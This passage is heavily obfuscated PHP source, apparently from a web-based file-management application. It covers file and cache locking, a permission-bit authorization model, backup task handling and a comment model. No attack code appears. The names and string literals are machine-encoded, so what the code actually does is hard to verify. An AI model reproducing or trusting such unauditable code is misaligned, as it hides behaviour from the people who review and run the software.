$üâì›Ù‚ . $ºîË¡¤[842] . self::$errorMsg; } write_log($³£µÆ§¾, $ºîË¡¤[837]); show_json($üâì›Ù‚, !1); } if (!$¡¾Ùé–) { self::$lockItem[$´¡êÎ»Á] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $œÚ½÷â = number_format(timeFloat() - $…•Ÿµû¹, 3); write_log($ºîË¡¤[843] . $ŒŒÆê¾ú . $ºîË¡¤[844] . $œÚ½÷â, $ºîË¡¤[837]); } return $î£ İî; } public static function lockGet($ì¡ß§šü) { $‚ò¦Ù‚‹ = self::key($ì¡ß§šü); if (self::$lockItem[$‚ò¦Ù‚‹]) { return self::$lockItem[$‚ò¦Ù‚‹]; } return self::init()->lockGet($‚ò¦Ù‚‹); } public static function unlock($ÙÈÓªè) { $ŞŒŸ³‚° =& $_SERVER[ê‘³Æ±]; $²ş±Îù = self::key($ÙÈÓªè); self::$lockItem[$²ş±Îù] = null; self::init()->unlock($²ş±Îù); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ŞŒŸ³‚°[845] . $ÙÈÓªè, $ŞŒŸ³‚°[837]); } return; } public static function unlockRuntime() { $¡¨½·®… =& $_SERVER[ê‘³Æ±]; $íí¼Åâ = self::init(); $‘õÆ° = !1; foreach (self::$lockItem as $…€·­š¾ => $½Ğ›­ñ) { if (!$½Ğ›­ñ) { continue; } $íí¼Åâ->unlock($…€·­š¾); if (!$‘õÆ°) { $‘õÆ° = !0; write_log($¡¨½·®…[846] . $…€·­š¾ . $¡¨½·®…[71] . get_caller_msg(), $¡¨½·®…[837]); continue; } write_log($¡¨½·®…[846] . $…€·­š¾, $¡¨½·®…[837]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $æµ„‚“ë = number_format(timeFloat() - TIME_FLOAT, 3); write_log($¡¨½·®…[847] . $æµ„‚“ë . $¡¨½·®…[848] . ACTION, $¡¨½·®…[837]); } } public static function fileLock($ŸÉ¼¸ó) { $ËÅÙ¢äÃ =& $_SERVER[ê‘³Æ±]; if (!$GLOBALS[$ËÅÙ¢äÃ[849]]) { $GLOBALS[$ËÅÙ¢äÃ[849]] = array(); } $GLOBALS[$ËÅÙ¢äÃ[849]][$ŸÉ¼¸ó] = !1; $ÏÅ£“© = fopen(DATA_PATH . $ŸÉ¼¸ó . $ËÅÙ¢äÃ[850], $ËÅÙ¢äÃ[851]); if (!$ÏÅ£“©) { return !1; } $GLOBALS[$ËÅÙ¢äÃ[849]][$ŸÉ¼¸ó] = $ÏÅ£“©; if (flock($ÏÅ£“©, LOCK_EX)) { return !0; } self::unlock($ŸÉ¼¸ó); show_json($ËÅÙ¢äÃ[852], !1); return !1; } public static function fileUnlock($ĞğÍÁµ¨) { $Îó…‚µª =& $_SERVER[ê‘³Æ±]; $£Ë€ç×’ = $GLOBALS[$Îó…‚µª[849]][$ĞğÍÁµ¨]; if (!$£Ë€ç×’) { return; } $GLOBALS[$Îó…‚µª[849]][$ĞğÍÁµ¨] = !1; flock($£Ë€ç×’, LOCK_UN); fclose($£Ë€ç×’); } public static function fileUnlockAll() { $â‡‘óó» =& $_SERVER[ê‘³Æ±]; if (!$GLOBALS[$â‡‘óó»[849]]) { return; } foreach ($GLOBALS[$â‡‘óó»[849]] as $ÀÒ¸¨˜® => $ˆÈÙÇÀš) { if (!$ˆÈÙÇÀš) { continue; } $GLOBALS[$â‡‘óó»[849]][$ÀÒ¸¨˜®] = !1; flock($ˆÈÙÇÀš, LOCK_UN); fclose($ˆÈÙÇÀš); } $GLOBALS[$â‡‘óó»[849]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ÌâØÙ®æ =& $_SERVER[ê‘³Æ±]; $õ›ı‹¾œ = $GLOBALS[$ÌâØÙ®æ[6]][$ÌâØÙ®æ[346]]; self::$cachePath = $õ›ı‹¾œ[$ÌâØÙ®æ[194]][$ÌâØÙ®æ[78]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Ò—êä, $ã—Ë‹– = 0) { $•¡ĞŸ¤ =& $_SERVER[ê‘³Æ±]; $÷ê÷ˆ¦ = microtime(!0); $„ò¤Ç— = $÷ê÷ˆ¦ + $ã—Ë‹– + 0.0001; $ƒØáÉŒĞ = rtrim(self::$cachePath, $•¡ĞŸ¤[8]) . $•¡ĞŸ¤[853] . md5($Ò—êä) . $•¡ĞŸ¤[850]; if (file_exists($ƒØáÉŒĞ) && filemtime($ƒØáÉŒĞ) && filemtime($ƒØáÉŒĞ) < time() - 10) { @unlink($ƒØáÉŒĞ); } do { if (file_exists($ƒØáÉŒĞ)) { cacheLockWait(); continue; } $‚ËÙî‡ö = fopen($ƒØáÉŒĞ, $•¡ĞŸ¤[854]); if (!$‚ËÙî‡ö) { return !1; } $Š¨¾‚—À = flock($‚ËÙî‡ö, LOCK_EX | LOCK_NB); self::$caches[$Ò—êä] = array($•¡ĞŸ¤[855] => $‚ËÙî‡ö, $•¡ĞŸ¤[194] => $ƒØáÉŒĞ); fwrite($‚ËÙî‡ö, $„ò¤Ç—); clearstatcache(); if ($‚ËÙî‡ö && $Š¨¾‚—À) { return !0; } cacheLockWait(); } while (microtime(!0) < $„ò¤Ç—); $this->unlock($Ò—êä); return !1; } public function lockGet($öâíÍŞ½) { $Ø´Ù¤Ô× =& $_SERVER[ê‘³Æ±]; $Ìë„É¤É = rtrim(self::$cachePath, $Ø´Ù¤Ô×[8]) . $Ø´Ù¤Ô×[853] . md5($öâíÍŞ½) . $Ø´Ù¤Ô×[850]; return file_exists($Ìë„É¤É); } public function unlock($Û­·ôÅÉ) { $¹•ß×Óñ =& $_SERVER[ê‘³Æ±]; $Ãº‹ØÆ  = self::$caches[$Û­·ôÅÉ]; if (!$Ãº‹ØÆ ) { return; } @flock($Ãº‹ØÆ [$¹•ß×Óñ[855]], LOCK_UN); @fclose($Ãº‹ØÆ [$¹•ß×Óñ[855]]); @unlink($Ãº‹ØÆ [$¹•ß×Óñ[194]]); unset(self::$caches[$Û­·ôÅÉ]); } } goto AˆÜ“Ñ»¢©; d”¼¥“ÂïÌ: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¸³¹ëô¢ =& $_SERVER[ê‘³Æ±]; $”¿ˆò° = array(array($¸³¹ëô¢[414] => LNG($¸³¹ëô¢[1810]), $¸³¹ëô¢[1811] => $¸³¹ëô¢[1812], $¸³¹ëô¢[1813] => 1, $¸³¹ëô¢[1814] => 1, $¸³¹ëô¢[1815] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¸³¹ëô¢[414] => LNG($¸³¹ëô¢[1816]), $¸³¹ëô¢[1811] => $¸³¹ëô¢[1817], $¸³¹ëô¢[1813] => 2, $¸³¹ëô¢[1814] => 1, $¸³¹ëô¢[1815] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¸³¹ëô¢[414] => LNG($¸³¹ëô¢[1818]), $¸³¹ëô¢[1811] => $¸³¹ëô¢[1819], $¸³¹ëô¢[1813] => 3, $¸³¹ëô¢[1814] => 1, $¸³¹ëô¢[1815] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¸³¹ëô¢[414] => LNG($¸³¹ëô¢[1820]), $¸³¹ëô¢[1811] => $¸³¹ëô¢[1821], $¸³¹ëô¢[1813] => 4, $¸³¹ëô¢[1814] => 1, $¸³¹ëô¢[1815] => self::AUTH_SHOW | self::AUTH_VIEW), array($¸³¹ëô¢[414] => LNG($¸³¹ëô¢[1822]), $¸³¹ëô¢[1811] => $¸³¹ëô¢[1823], $¸³¹ëô¢[1813] => 5, $¸³¹ëô¢[1814] => 1, $¸³¹ëô¢[1815] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¸³¹ëô¢[414] => LNG($¸³¹ëô¢[1824]), $¸³¹ëô¢[1811] => $¸³¹ëô¢[1825], $¸³¹ëô¢[1813] => 6, $¸³¹ëô¢[1814] => 1, $¸³¹ëô¢[1815] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¸³¹ëô¢[414] => LNG($¸³¹ëô¢[1826]), $¸³¹ëô¢[1811] => $¸³¹ëô¢[1827], $¸³¹ëô¢[1813] => 7, $¸³¹ëô¢[1814] => 1, $¸³¹ëô¢[1815] => 0)); return $”¿ˆò°; } public static function authCheck($°…’ÚœÅ, $÷¼ËªÉÄ) { $°…’ÚœÅ = intval($°…’ÚœÅ); if ($GLOBALS[$_SERVER[ê‘³Æ±][496]]) { return !0; } if ($°…’ÚœÅ <= 0) { return !1; } if (($°…’ÚœÅ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($°…’ÚœÅ & $÷¼ËªÉÄ); } public static function authCheckShow($ïºŒµùÛ) { return self::authCheck($ïºŒµùÛ, self::AUTH_SHOW); } public static function authCheckView($ĞâË•÷³) { return self::authCheck($ĞâË•÷³, self::AUTH_VIEW); } public static function authCheckDownload($µ²…Ë¥Ê) { return self::authCheck($µ²…Ë¥Ê, self::AUTH_DOWNLOAD); } public static function authCheckUpload($˜Ã­¦µÂ) { return self::authCheck($˜Ã­¦µÂ, self::AUTH_UPLOAD); } public static function authCheckEdit($úªøš) { return self::authCheck($úªøš, self::AUTH_EDIT); } public static function authCheckRemove($ı·‡æ»ú) { return self::authCheck($ı·‡æ»ú, self::AUTH_REMOVE); } public static function authCheckShare($¶áÖ‹‰ğ) { return self::authCheck($¶áÖ‹‰ğ, self::AUTH_SHARE); } public static function authCheckComment($£Ñ„Âí¾) { return self::authCheck($£Ñ„Âí¾, self::AUTH_COMMENT); } public static function authCheckEvent($ëå‘îåÉ) { return self::authCheck($ëå‘îåÉ, self::AUTH_EVENT); } public static function authCheckRoot($…¦Ñ…¸Á) { return self::authCheck($…¦Ñ…¸Á, self::AUTH_ROOT); } public static function authCheckAction($íÀÖ»š, $âüÕÕÍã) { $²Ìí€ŠÆ =& $_SERVER[ê‘³Æ±]; $»ôõÄ×ù = array($²Ìí€ŠÆ[1828] => self::AUTH_VIEW, $²Ìí€ŠÆ[1186] => self::AUTH_DOWNLOAD, $²Ìí€ŠÆ[108] => self::AUTH_UPLOAD, $²Ìí€ŠÆ[1779] => self::AUTH_EDIT, $²Ìí€ŠÆ[1778] => self::AUTH_REMOVE, $²Ìí€ŠÆ[1789] => self::AUTH_SHARE, $²Ìí€ŠÆ[351] => self::AUTH_COMMENT, $²Ìí€ŠÆ[1629] => self::AUTH_EVENT, $²Ìí€ŠÆ[1829] => self::AUTH_ROOT); if (!isset($»ôõÄ×ù[$âüÕÕÍã])) { return; } $èÛ¢¯Ü = $»ôõÄ×ù[$âüÕÕÍã]; $íÀÖ»š = intval($íÀÖ»š); if ($íÀÖ»š <= 0) { return !1; } if (($íÀÖ»š & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($íÀÖ»š & $èÛ¢¯Ü); } public static function authDisable($‚¤÷©ºû, $÷ªò÷»›) { if (intval($‚¤÷©ºû) <= 0) { return 0; } return intval($‚¤÷©ºû) & ~$÷ªò÷»›; } public $optionType = "\123\171\163\x74\145\x6d\56\x73\157\165\162\x63\145\101\x75\x74\x68\114\x69\x73\x74"; public $field = array("\156\x61\155\145", "\x61\165\164\x68", "\154\141\142\145\x6c", "\144\151\x73\160\x6c\141\171", "\x73\171\x73\x74\x65\155", "\x73\x6f\162\164"); public function initData() { $„–çÖ²Ä = $this->authDefault(); foreach ($„–çÖ²Ä as $¦÷æ£Îû) { $this->add($¦÷æ£Îû); } } public function findAuth($»ºÙàö®, $‚Ìæ­öÆ) { $ô°ı å¥ =& $_SERVER[ê‘³Æ±]; $®ªëİ½È = parent::listData(); foreach ($®ªëİ½È as $âª²±…ğ) { $¦ˆ ó² = intval($âª²±…ğ[$ô°ı å¥[407]]); if ($¦ˆ ó² <= 0 || $âª²±…ğ[$ô°ı å¥[1830]] == 0) { continue; } if (($¦ˆ ó² & $»ºÙàö®) != $»ºÙàö®) { continue; } if (($¦ˆ ó² & $‚Ìæ­öÆ) != 0) { continue; } return $âª²±…ğ[$ô°ı å¥[394]]; } return !1; } public function findAuthReadOnly() { $ ê§Ì = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ÌËé­–í = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ ê§Ì, $ÌËé­–í); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($ö÷ú½†» = false, $§·Œãî = "\163\157\162\164", $‚¸ª¤¾ğ = false) { return parent::listData($ö÷ú½†», $§·Œãî, $‚¸ª¤¾ğ); } public function update($¥éí£ï, $ÓÊñ¿à) { $íôŒò¬× =& $_SERVER[ê‘³Æ±]; $°Ç¿õó¥ = parent::listData($¥éí£ï); $Ä’ïÛ¡Í = $this->findByName($ÓÊñ¿à[$íôŒò¬×[32]]); if (!$°Ç¿õó¥ || $Ä’ïÛ¡Í && $Ä’ïÛ¡Í[$íôŒò¬×[394]] != $°Ç¿õó¥[$íôŒò¬×[394]]) { return !1; } $this->filterAuth($ÓÊñ¿à[$íôŒò¬×[407]]); return parent::update($¥éí£ï, $ÓÊñ¿à); } public function remove($Ñôû¡¬Ô) { $½†¸ˆ = parent::listData($Ñôû¡¬Ô); if (!$½†¸ˆ || $½†¸ˆ[$_SERVER[ê‘³Æ±][1263]]) { return !1; } return parent::remove($Ñôû¡¬Ô); } public function add($ªÔÕÑ†ü = array()) { $—«ûƒ  =& $_SERVER[ê‘³Æ±]; if ($this->findByName($ªÔÕÑ†ü[$—«ûƒ [32]])) { return !1; } $ğ˜Şü²° = array($—«ûƒ [32] => $—«ûƒ [12], $—«ûƒ [407] => 1, $—«ûƒ [1831] => $—«ûƒ [1819], $—«ûƒ [1830] => 1, $—«ûƒ [1263] => 0, $—«ûƒ [1832] => 0); $ªÔÕÑ†ü = array_merge($ğ˜Şü²°, $ªÔÕÑ†ü); $ªÔÕÑ†ü[$—«ûƒ [1832]] = $this->getSort(); $this->filterAuth($ªÔÕÑ†ü[$—«ûƒ [407]]); return parent::insert($ªÔÕÑ†ü); } private function getSort() { $Õ‰±¿Ç =& $_SERVER[ê‘³Æ±]; $†íà¼ôÃ = parent::listData(); $ïÈ³«’¸ = array_to_keyvalue($†íà¼ôÃ, $Õ‰±¿Ç[12], $Õ‰±¿Ç[1832]); return empty($ïÈ³«’¸) ? 0 : max($ïÈ³«’¸) + 1; } private function filterAuth(&$Ë­¢¿Ãˆ) { if (!$Ë­¢¿Ãˆ) { return; } $ê•Ú«º = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $½¸Ê¤À = array(); foreach ($ê•Ú«º as $™Çéà¹) { if ($Ë­¢¿Ãˆ & $™Çéà¹) { $½¸Ê¤À[] = $™Çéà¹; } } if (in_array(self::AUTH_ROOT, $½¸Ê¤À)) { $Ë­¢¿Ãˆ = array_sum($ê•Ú«º); return; } $ı…ÚªÏ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($½¸Ê¤À as $™Çéà¹) { if (isset($ı…ÚªÏ[$™Çéà¹])) { $½¸Ê¤À = array_merge($½¸Ê¤À, $ı…ÚªÏ[$™Çéà¹]); } } $½¸Ê¤À[] = self::AUTH_SHOW; $Ë­¢¿Ãˆ = array_sum(array_unique($½¸Ê¤À)); } public function sort($ïî¨‚ , $ËŸú˜®Õ) { return parent::update($ïî¨‚ , $ËŸú˜®Õ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\56\142\141\143\x6b\165\160\x4c\x69\163\x74"; public $field = array("\151\x6f", "\156\x61\155\x65", "\x73\164\x61\x74\x75\163", "\x63\157\156\x74\x65\x6e\164", "\155\x61\x6e\165\141\154", "\x72\x65\x73\165\x6c\x74", "\164\151\155\x65\106\162\x6f\155", "\164\151\155\x65\x54\x6f"); public function config() { $„ğÒë´ü =& $_SERVER[ê‘³Æ±]; $£«‚„Ã¥ = Model($„ğÒë´ü[756])->get($„ğÒë´ü[766]); $£«‚„Ã¥ = json_decode($£«‚„Ã¥, !0); $£«‚„Ã¥ = is_array($£«‚„Ã¥) ? $£«‚„Ã¥ : array(); if (!isset($£«‚„Ã¥[$„ğÒë´ü[741]])) { $£«‚„Ã¥[$„ğÒë´ü[741]] = $„ğÒë´ü[89]; } unset($£«‚„Ã¥[$„ğÒë´ü[1611]]); Action($„ğÒë´ü[1833])->taskInit(); Model($„ğÒë´ü[1610])->cacheClear(); $Ãƒ–Ñ‰ã = $„ğÒë´ü[1834]; $²êôäË = Model($„ğÒë´ü[1835])->findByKey($„ğÒë´ü[1629], $Ãƒ–Ñ‰ã); if (!$²êôäË) { $²êôäË = array(); } if (isset($²êôäË[$„ğÒë´ü[198]])) { $²êôäË[$„ğÒë´ü[198]] = json_decode($²êôäË[$„ğÒë´ü[198]], !0); } if (isset($£«‚„Ã¥[$„ğÒë´ü[198]])) { $²êôäË[$„ğÒë´ü[198]][$„ğÒë´ü[1614]] = $£«‚„Ã¥[$„ğÒë´ü[198]]; unset($£«‚„Ã¥[$„ğÒë´ü[198]]); } return array_merge($²êôäË, $£«‚„Ã¥); } public function listData($èµ¹çÆ = false, $úÍşÉáÏ = "\155\x6f\x64\x69\x66\171\124\x69\x6d\145", $“İïßš© = false) { return parent::listData($èµ¹çÆ, $úÍşÉáÏ, !0); } public function lastItem() { $İşåäÆ¤ = $this->listData(); return !empty($İşåäÆ¤[0]) ? $İşåäÆ¤[0] : null; } public function kill($Æ¯ù¹°) { $õªº¶¡õ =& $_SERVER[ê‘³Æ±]; $Öû¹¾Ê = $this->listData($Æ¯ù¹°); if (!$Öû¹¾Ê || empty($Öû¹¾Ê[$õªº¶¡õ[32]])) { return !0; } Task::kill($õªº¶¡õ[765]); Task::kill($õªº¶¡õ[794]); Task::kill($õªº¶¡õ[803]); $³üŸ¹Ø = $Öû¹¾Ê[$õªº¶¡õ[32]]; $ŞŸø½Ê = TEMP_FILES . $õªº¶¡õ[764] . $³üŸ¹Ø . $õªº¶¡õ[8]; IO::remove($ŞŸø½Ê, !1); return $this->remove($Æ¯ù¹°); } public function remove($¢¶±Æ’) { $–„åÖ¸ = $this->listData($¢¶±Æ’); if (!$–„åÖ¸) { return !0; } return $this->backupRemove($–„åÖ¸); } private function backupRemove($êâòıèÌ) { parent::remove($êâòıèÌ[$_SERVER[ê‘³Æ±][394]]); $ûˆ”¼ê = $this->backupPath($êâòıèÌ); IO::remove($ûˆ”¼ê, !1); return !0; } private function backupPath($Ò¤­·Ë) { $ÈŒÚù¢¿ =& $_SERVER[ê‘³Æ±]; $Êö—¨Ïı = $Ò¤­·Ë[$ÈŒÚù¢¿[32]]; $Éâõä¶† = Model($ÈŒÚù¢¿[756])->get($ÈŒÚù¢¿[757]); $½Ÿ¹•£… = substr(md5($ÈŒÚù¢¿[758] . $Éâõä¶† . $Êö—¨Ïı), 0, 8); return "\x7b\x69\157\x3a{$Ò¤­·Ë[$ÈŒÚù¢¿[738]]}\175\x2f\144\x61\x74\x61\x62\x61\x73\x65\x2f\142\141\x63\x6b\x75\160\57" . $Êö—¨Ïı . $ÈŒÚù¢¿[11] . $½Ÿ¹•£…; } public function start() { $Çú¬ëñ† =& $_SERVER[ê‘³Æ±]; if ($GLOBALS[$Çú¬ëñ†[6]][$Çú¬ëñ†[90]][$Çú¬ëñ†[1836]] != $Çú¬ëñ†[89]) { return !0; } $¸—áÅ´ = $this->config(); if (!$¸—áÅ´ || $¸—áÅ´[$Çú¬ëñ†[1611]] != $Çú¬ëñ†[89]) { return !1; } $ê¶˜ÅÚ = $this->process(); foreach ($ê¶˜ÅÚ as $¥“¾ñ±Ç) { if ($¥“¾ñ±Ç) { return Task::restart($¥“¾ñ±Ç[$Çú¬ëñ†[394]]); } } $ª¢ïÊ®Î = new Backup(); $Šã£éÑ¾ = $ª¢ïÊ®Î->db(); if ($Šã£éÑ¾) { $Šã£éÑ¾ = $ª¢ïÊ®Î->dbFile(); if ($Šã£éÑ¾ && $¸—áÅ´[$Çú¬ëñ†[741]] == $Çú¬ëñ†[192]) { $Šã£éÑ¾ = $ª¢ïÊ®Î->file(); } } Backup::set(array($Çú¬ëñ†[736] => 1, $Çú¬ëñ†[489] => time())); return !0; } public function process() { $ÃÏŸùùí =& $_SERVER[ê‘³Æ±]; $Šâ­±¸± = array($ÃÏŸùùí[744] => Task::get($ÃÏŸùùí[765]), $ÃÏŸùùí[748] => Task::get($ÃÏŸùùí[794]), $ÃÏŸùùí[194] => Task::get($ÃÏŸùùí[803])); $‘öŠôÉ“ = !1; foreach ($Šâ­±¸± as &$æ÷†ª®) { if ($‘öŠôÉ“) { $æ÷†ª® = !1; continue; } if ($æ÷†ª®) { $ñæÛ¿ = intval(_get($æ÷†ª®, $ÃÏŸùùí[1646], 0)); if (time() - $ñæÛ¿ > 7200) { Task::kill($æ÷†ª®[$ÃÏŸùùí[394]]); $‘öŠôÉ“ = !0; $æ÷†ª® = !1; } } } return $Šâ­±¸±; } public function restore() { $Êî„µò =& $_SERVER[ê‘³Æ±]; ActionCall($Êî„µò[1049], !0, 1); ActionCall($Êî„µò[1049], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\x6d\x6d\x65\156\164"; protected $tableMeta = array("\164\x61\142\x6c\x65\116\x61\155\x65" => "\143\x6f\x6d\155\145\x6e\x74\x5f\155\145\x74\x61", "\155\145\164\141\106\x69\x65\154\x64" => "\x63\157\x6d\155\x65\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($†Š„–Õ§) { $‹²íÁ¡Ö =& $_SERVER[ê‘³Æ±]; if ($†Š„–Õ§[$‹²íÁ¡Ö[1837]]) { $“™ÏíÔ¿ = $this->where(array($‹²íÁ¡Ö[1838] => $†Š„–Õ§[$‹²íÁ¡Ö[1837]]))->find(); if (!$“™ÏíÔ¿ || $“™ÏíÔ¿[$‹²íÁ¡Ö[405]] != $†Š„–Õ§[$‹²íÁ¡Ö[405]] || $“™ÏíÔ¿[$‹²íÁ¡Ö[498]] != $†Š„–Õ§[$‹²íÁ¡Ö[498]]) { return !1; } $this->where(array($‹²íÁ¡Ö[1838] => $†Š„–Õ§[$‹²íÁ¡Ö[1837]]))->setAdd($‹²íÁ¡Ö[1839], 1); } $†Š„–Õ§[$‹²íÁ¡Ö[1840]] = 0; $†Š„–Õ§[$‹²íÁ¡Ö[1839]] = 0; $†Š„–Õ§[$‹²íÁ¡Ö[736]] = 1; return $this->add($†Š„–Õ§); } public function commentCount($å«ëŠ¼´, $âÓÁ­åŒ, $ÊØ ôÔü = false) { $¡øÃ¶Ü =& $_SERVER[ê‘³Æ±]; if (!$å«ëŠ¼´) { return array(); } if (is_string($å«ëŠ¼´) || is_int($å«ëŠ¼´)) { $å«ëŠ¼´ = array($å«ëŠ¼´); } $´è ‹®¾ = array($¡øÃ¶Ü[498], $¡øÃ¶Ü[1841] => $¡øÃ¶Ü[493]); $èæÁÔ¨Ó = array($¡øÃ¶Ü[498] => array($¡øÃ¶Ü[7], $å«ëŠ¼´), $¡øÃ¶Ü[405] => $âÓÁ­åŒ); if ($ÊØ ôÔü) { $èæÁÔ¨Ó[$¡øÃ¶Ü[1641]] = $ÊØ ôÔü; } $†åÕ’ü® = $this->field($´è ‹®¾)->where($èæÁÔ¨Ó)->group($¡øÃ¶Ü[498])->select(); return array_to_keyvalue($†åÕ’ü®, $¡øÃ¶Ü[498], $¡øÃ¶Ü[493]); } public function starTarget($õÊ¼—÷°, $»„—°ë) { $Ä¨–¢õñ =& $_SERVER[ê‘³Æ±]; $æ­×İ¿ = $õÊ¼—÷° + self::TYPE_STAR_OFFSET; $ô÷Ú÷‰‘ = array($Ä¨–¢õñ[1641] => USER_ID, $Ä¨–¢õñ[405] => $æ­×İ¿, $Ä¨–¢õñ[498] => $»„—°ë); $ÑÎÒ‰á´ = $this->where($ô÷Ú÷‰‘)->find(); if ($ÑÎÒ‰á´) { return $this->where(array($Ä¨–¢õñ[394] => $ÑÎÒ‰á´[$Ä¨–¢õñ[394]]))->delete(); } $æ®ì Æ´ = array($Ä¨–¢õñ[1837] => 0, $Ä¨–¢õñ[1641] => USER_ID, $Ä¨–¢õñ[736] => 1, $Ä¨–¢õñ[741] => $Ä¨–¢õñ[12], $Ä¨–¢õñ[405] => $æ­×İ¿, $Ä¨–¢õñ[498] => $»„—°ë, $Ä¨–¢õñ[1840] => 0, $Ä¨–¢õñ[1839] => 0); return $this->add($æ®ì Æ´); } public function starTargetCount($ıÖ˜›Í÷, $ûøÍÖ•¤) { $‘¶ùıóÛ =& $_SERVER[ê‘³Æ±]; $ãûÈöÍ® = $ûøÍÖ•¤ + self::TYPE_STAR_OFFSET; $åÍ°³û = $this->commentCount($ıÖ˜›Í÷, $ãûÈöÍ®); $èÅ£Íúæ = $this->commentCount($ıÖ˜›Í÷, $ãûÈöÍ®, USER_ID); return array($‘¶ùıóÛ[1842] => $åÍ°³û, $‘¶ùıóÛ[1843] => $èÅ£Íúæ); } public function starTargetUserList($÷ßúë—Á, $ñÁŞ¸·¦) { $ÒÙõÓƒÖ =& $_SERVER[ê‘³Æ±]; $›°ßêÎÑ = $÷ßúë—Á + self::TYPE_STAR_OFFSET; $ÜÁ‰òÇà = array($ÒÙõÓƒÖ[498] => $ñÁŞ¸·¦, $ÒÙõÓƒÖ[405] => $›°ßêÎÑ); $ÙŸ‰„¤ = $this->where($ÜÁ‰òÇà)->count(); $Ì–”Í»Œ = array($ÒÙõÓƒÖ[252] => $ÙŸ‰„¤, $ÒÙõÓƒÖ[1844] => array()); if (!$ÙŸ‰„¤) { return $Ì–”Í»Œ; } $Ñ®ØÜ˜½ = $this->field($ÒÙõÓƒÖ[1641])->where($ÜÁ‰òÇà)->limit(500)->select(); $Ñ®ØÜ˜½ = array_to_keyvalue($Ñ®ØÜ˜½, $ÒÙõÓƒÖ[12], $ÒÙõÓƒÖ[1641]); $Ì–”Í»Œ[$ÒÙõÓƒÖ[1844]] = Model($ÒÙõÓƒÖ[506])->userListInfo($Ñ®ØÜ˜½); return $Ì–”Í»Œ; } public function prasiseUserList($û’¼ì™) { $äİéæ¯ =& $_SERVER[ê‘³Æ±]; $ËÕøÚ¥ä = array($äİéæ¯[1845] => $û’¼ì™); $ĞÌóÆÜÒ = $this->where($ËÕøÚ¥ä)->find(); $Ê¦•óª = _get($ĞÌóÆÜÒ, $äİéæ¯[1840], 0); $üò¥’Ê = array($äİéæ¯[252] => $Ê¦•óª, $äİéæ¯[1844] => array()); if (!$Ê¦•óª) { return $üò¥’Ê; } $áÓ£·³ä = Model($äİéæ¯[1846])->field($äİéæ¯[1641])->where($ËÕøÚ¥ä)->limit(500)->select(); $áÓ£·³ä = array_to_keyvalue($áÓ£·³ä, $äİéæ¯[12], $äİéæ¯[1641]); $üò¥’Ê[$äİéæ¯[1844]] = Model($äİéæ¯[506])->userListInfo($áÓ£·³ä); return $üò¥’Ê; } public function remove($ñ»çÚÌ–) { $“Ş¬¸§ =& $_SERVER[ê‘³Æ±]; $•Á¡™€ = array($“Ş¬¸§[1838] => $ñ»çÚÌ–); $Á³áºÓ„ = $this->where($•Á¡™€)->find(); if ($Á³áºÓ„[$“Ş¬¸§[1837]]) { $this->where(array($“Ş¬¸§[1838] => $Á³áºÓ„[$“Ş¬¸§[1837]]))->setAdd($“Ş¬¸§[1839], -1); } return $this->where($•Á¡™€)->delete(); } public function edit($¦Ùƒª½·, $ƒ¡ÃùÇ) { $¬ªÜšç =& $_SERVER[ê‘³Æ±]; $±§çÄ¼í = array($¬ªÜšç[1838] => $¦Ùƒª½·); return $this->where($±§çÄ¼í)->save(array($¬ªÜšç[1847] => $ƒ¡ÃùÇ)); } public function prasise($ŒÆ­üıú) { $ì»å°¤Ú =& $_SERVER[ê‘³Æ±]; $÷Äô‹ÜÎ = 